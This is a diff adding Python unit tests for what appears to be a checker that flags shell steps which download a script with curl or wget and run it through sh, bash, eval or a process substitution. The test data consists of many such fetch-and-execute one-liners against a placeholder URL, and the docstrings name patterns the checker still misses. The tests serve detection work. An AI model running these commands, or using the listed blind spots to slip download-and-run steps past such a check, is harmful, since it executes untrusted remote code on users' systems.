@@ -2190,6 +2190,7 @@ class TestEveryFindActionIsACommand(unittest.TestCase):
         ("workflow_forms", "flattened"): "find /dev/null -exec sh -c '%s' \\;\n" % PIPE,
         ("workflow_guard", "_walk"): FETCHED + "sh tool\n",
         ("workflow_guard", "_unread_stdin"): GET + "T=tool\nfind /dev/null -exec sh \\; <<EOF\nsh $T\nEOF\n",
+        ("workflow_called", "at"): "f() { find /dev/null -exec curl -fsSL %si.sh \\; ; }\nf | sh\n" % URL,
         ("workflow_fetch", "stdout_fetch"): "x=$(find /dev/null -exec curl -fsSL %si.sh \\;)\nsh -c \"$x\"\n" % URL,
         ("workflow_fetch", "stream_consumer"): "curl -fsSL %si.sh | find /dev/null -exec sh \\;\n" % URL,
         ("workflow_fetch", "compound_output"): "curl -fsSL %stool | find /dev/null -exec tee tool \\;\nsh tool\n" % URL,
@@ -7445,6 +7446,80 @@ class TestAProgramPipedFromAPrinter(unittest.TestCase):
         said = "hands %si.sh straight to `sh`" % URL
         self.assertTrue(found[0][1].startswith(said), found)
 
+
+
+class TestAFunctionThatFetchesIsReadWhereItIsCalled(unittest.TestCase):
+    """#3050: a function whose body fetches to its standard output, called where a shell reads that
+    output, read CLEAN while every shell runs the download (`main` 04e06272, the issue's 12 rows and
+    the 14 of its context, and the 4 of this class's own). The call is read now as the body's fetches
+    where it stands (`workflow_called.CalledFetches`, the walk): in a pipe, a process or command
+    substitution, a redirect to a file, with the call's words in the body's positionals (a download
+    helper), through a function the body calls, and with the body's own redirects read as the inline
+    twin's are (#2744). The controls still read CLEAN: a function never called, a call whose output is
+    discarded, a wrapper in front of the name, a definition after the call. Limits, pinned and named
+    below: a download held in a variable (`x=$(f)`), the file and not the stream of a body's own
+    `| tee t`, and a `{ f; } | sh` group behind a definition (#3069)."""
+
+    F = "curl -fsSL %si.sh" % URL
+    STREAM = "hands %si.sh straight to `%s`" % (URL, "%s")
+    FILE = "fetches %si.sh -> t and running it under `sh`" % URL
+
+    def test_the_issues_rows_report_under_every_setting(self):
+        rows = {"f() { F; }\nf | sh\n": self.STREAM % "sh", "f() { F; }\nf | bash\n": self.STREAM % "bash",
+                "f() { wget -qO- %si.sh; }\nf | sh\n" % URL: self.STREAM % "sh",
+                "function f { F; }\nf | sh\n": self.STREAM % "sh",
+                'f() { curl -fsSL "$1"; }\nf %si.sh | sh\n' % URL: self.STREAM % "sh",
+                "f() { F; }\nsh <(f)\n": self.STREAM % "sh", 'f() { F; }\neval "$(f)"\n': self.STREAM % "eval",
+                'f() { F; }\nsh -c "$(f)"\n': self.STREAM % "sh -c", "f() { F; }\ng() { f; }\ng | sh\n": self.STREAM % "sh",
+                "f() { F; }\nf > t\nsh t\n": self.FILE,
+                'dl() { curl -fsSL "$1" -o "$2"; }\ndl %si.sh t\nsh t\n' % URL: self.FILE,
+                "f() { echo start; F; echo end; }\nf | sh\n": self.STREAM % "sh",
+                "f() { F && echo ok; }\nf | sh\n": self.STREAM % "sh", "f() { F; }\nf 2>/dev/null | sh\n": self.STREAM % "sh",
+                "f() { F; }\nf | tee t | sh\n": self.STREAM % "sh", "f() ( F )\nf | sh\n": self.STREAM % "sh"}
+        for row, why in rows.items():
+            script = row.replace("F;", self.F + ";").replace("F ", self.F + " ").replace("F)", self.F + " )").replace("{ F", "{ " + self.F) + "echo done\n"
+            with self.subTest(row=row):
+                self.assertEqual("RRRRR", "".join("CR"[reported(script, shell)] for shell in SHELLS))
+                self.assertTrue(any(why in w for _step, w in defects(script)), (why, defects(script)))
+
+    def test_the_bodys_own_redirects_read_as_the_inline_twins_do(self):
+        # The context rows: a written path of one of the body's own descriptors (#2744) leaves the download
+        # on the function's standard output, or not: `> /dev/stderr` leaves nothing on it, as inline.
+        for redirect, reports in (("> /dev/stdout", True), ("> //dev/stdout", True), ("> /dev/./stdout", True),
+                                  ("> /dev/fd/1", True), ("> /proc/self/fd/1", True), (">> /dev/stdout", True),
+                                  ("-o /dev/stdout", True), ("-o //dev/stdout", True), ("-o /dev/fd/1", True),
+                                  ("2>&1 > /dev/stderr", True), ("2>&1 > /dev/fd/2", True), ("3>&1 > /dev/fd/3", True),
+                                  ("> /dev/stderr", False), ("> /dev/null", False), ("-o /dev/null", False)):
+            script = "f() { %s %s; }\nf | sh\necho done\n" % (self.F, redirect)
+            with self.subTest(redirect=redirect):
+                self.assertEqual("RRRRR" if reports else "CCCCC", "".join("CR"[reported(script, shell)] for shell in SHELLS))
+
+    def test_the_controls_still_read_clean(self):
+        for script in ("f() { F; }\ntrue | sh\n", "f() { F; }\nf > /dev/null\n", "f() { F; }\nenv f | sh\n",
+                       "sh <(f)\nf() { F; }\n", "f() { F; }\nf &\nsh t\n", "f() { F > t2; }\nf | sh\n"):
+            script = script.replace("F", self.F) + "echo done\n"
+            with self.subTest(script=script):
+                self.assertEqual("CCCCC", "".join("CR"[reported(script, shell)] for shell in SHELLS))
+
+    def test_a_file_the_body_names_is_read_once_at_its_definition(self):
+        # `fetches` holds one record for the body's `-o t`, as before the call was read (M1 above): the
+        # call adds the definition's reading again only where it gave a positional a word.
+        self.assertEqual(1, len(wg.fetches("dl() { %s -o t; }\ndl\nsh t\n" % self.F)))
+        self.assertEqual(2, len(wg.fetches('dl() { curl -fsSL "$1" -o t; }\ndl %si.sh\nsh t\n' % URL)))
+        self.assertEqual([self.FILE], [w.split(" with ")[0] for _step, w in defects("dl() { %s -o t; }\ndl\nsh t\n" % self.F)])
+
+    def test_the_limits_pinned(self):
+        # Each reads CLEAN while every shell runs the download, and waits for what it is named with:
+        # `x=$(f)` then `eval "$x"` -- `workflow_forms.carried` asks `workflow_fetch.stdout_fetch` whether
+        # `$(f)` is one fetch to standard output, and neither sees the step's functions yet (a follow-up
+        # of #3050, after #2829; the coordinator's ruling, Krab seq 2797); a body's own `| tee t` -- a stage
+        # that pipes on inside the body is read at its definition alone, so the file and not the stream;
+        # `{ f; } | sh` behind a definition -- the compound reader loses the group's consumer behind a
+        # function's `}`, as it does the inline group's (#3069).
+        for script in ('f() { F; }\nx=$(f)\neval "$x"\n', "f() { F | tee t; }\nf | sh\n", "f() { F; }\n{ f; } | sh\n"):
+            script = script.replace("F", self.F) + "echo done\n"
+            with self.subTest(script=script):
+                self.assertEqual("CCCCC", "".join("CR"[reported(script, shell)] for shell in SHELLS))
 
 if __name__ == "__main__":
     unittest.main()
